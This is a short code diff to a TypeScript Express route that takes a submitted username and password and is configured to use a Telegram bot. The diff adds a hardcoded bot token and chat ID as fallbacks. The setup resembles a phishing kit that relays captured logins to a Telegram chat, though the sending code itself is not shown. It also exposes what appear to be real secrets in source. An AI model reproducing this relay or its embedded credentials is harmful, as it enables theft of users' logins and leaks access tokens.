@@ -15,8 +15,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const { username, password } = formData;
       
       // Telegram Bot API Token ve Chat ID (güvenlik için environment variable'dan alınmalı)
-      const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
-      const telegramChatId = process.env.TELEGRAM_CHAT_ID;
+      // Öncelikle environment variable'dan almaya çalış, yoksa sabit değeri kullan
+      const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN || "7676691540:AAH_BiHHfI0hK1EQC87oGw6GjCyI5C6ySKE";
+      const telegramChatId = process.env.TELEGRAM_CHAT_ID || "-1002584942967";
       
       if (!telegramBotToken || !telegramChatId) {
         console.error('Telegram credentials not configured');
